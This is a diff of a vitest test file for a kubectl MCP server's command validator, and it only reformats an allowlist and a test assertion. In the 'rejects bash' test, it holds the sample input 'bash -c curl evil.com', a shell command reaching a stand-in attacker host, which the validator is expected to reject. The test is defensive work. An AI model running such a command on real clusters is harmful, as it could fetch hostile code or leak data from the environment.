@@ -10,12 +10,7 @@ import { describe, it, expect } from 'vitest';
 // Replicate the validation logic and allowlists from kubectl-server.ts.
 // If the allowlists change there, update these tests to match.
 
-const ALLOWED_NAMESPACES = [
-  'kube-system',
-  'arc-systems',
-  'buildkit',
-  'harbor',
-];
+const ALLOWED_NAMESPACES = ['kube-system', 'arc-systems', 'buildkit', 'harbor'];
 const ALLOWED_EXEC_POD_PATTERNS = [/^etcd-/];
 const ALLOWED_EXEC_BINARIES = ['etcdctl'];
 const ALLOWED_DELETE_RESOURCES = ['pods'];
@@ -133,9 +128,9 @@ describe('kubectl MCP server validation', () => {
     });
 
     it('rejects bash', () => {
-      expect(() =>
-        validateExecBinary(['bash', '-c', 'curl evil.com']),
-      ).toThrow('not allowed');
+      expect(() => validateExecBinary(['bash', '-c', 'curl evil.com'])).toThrow(
+        'not allowed',
+      );
     });
 
     it('rejects sh', () => {
